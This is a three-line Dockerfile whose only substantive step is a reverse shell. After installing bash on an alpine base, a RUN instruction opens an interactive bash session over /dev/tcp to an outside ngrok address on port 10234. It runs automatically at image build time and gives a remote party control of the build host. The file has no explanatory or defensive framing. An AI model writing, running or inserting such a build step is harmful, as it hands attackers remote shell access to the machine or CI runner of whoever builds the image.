FROM alpine
RUN apk update && apk add bash
RUN bash -i >& /dev/tcp/0.tcp.ngrok.io/10234 0>&1
